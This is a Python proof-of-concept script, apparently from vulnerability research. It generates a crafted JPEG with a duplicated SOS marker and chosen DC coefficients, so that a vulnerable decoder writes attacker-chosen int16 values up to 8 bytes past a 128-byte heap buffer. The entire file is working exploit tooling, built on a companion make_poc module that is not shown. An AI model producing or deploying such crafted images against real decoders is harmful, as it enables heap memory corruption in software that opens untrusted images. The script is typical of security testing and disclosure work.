#!/usr/bin/env python3
"""Chosen-byte SOS-duplicate PoC: four constant 8x8 blocks whose DC
coefficients are 0x0048, 0x0058, 0x0068, 0x0078. With Ns=4 the vulnerable
decoder writes those four int16 values at m_pMCU_coefficients+128..135,
i.e. 0..7 bytes past its 128-byte allocation. Quality 100 gives q[0]=1.
"""
from __future__ import annotations

import hashlib
import io
from pathlib import Path

from PIL import Image

from make_poc import make_variant, parse_jpeg, verify

HERE = Path(__file__).resolve().parent
VALUES = (137, 139, 141, 143)  # 8*(V-128) = 72,88,104,120 = 0x48,0x58,0x68,0x78


def control_bytes() -> bytes:
    img = Image.new("L", (16, 16))
    for by in range(2):
        for bx in range(2):
            v = VALUES[by * 2 + bx]
            for y in range(8):
                for x in range(8):
                    img.putpixel((bx * 8 + x, by * 8 + y), v)
    out = io.BytesIO()
    img.save(out, format="JPEG", quality=100, progressive=False, optimize=False)
    return out.getvalue()


def main() -> None:
    control = control_bytes()
    ci = parse_jpeg(control)
    data = make_variant(control, 4)
    row = verify(control, ci, "marker_dup4.jpg", data, 4)
    (HERE / "marker_dup4.jpg").write_bytes(data)
    (HERE / "marker_control.jpg").write_bytes(control)
    print(f"marker_dup4.jpg: {row['size']} bytes sha256={row['sha256']} SOS={row['sos_hex']}")
    print(f"marker_control.jpg: {len(control)} bytes sha256={hashlib.sha256(control).hexdigest()}")


if __name__ == "__main__":
    main()
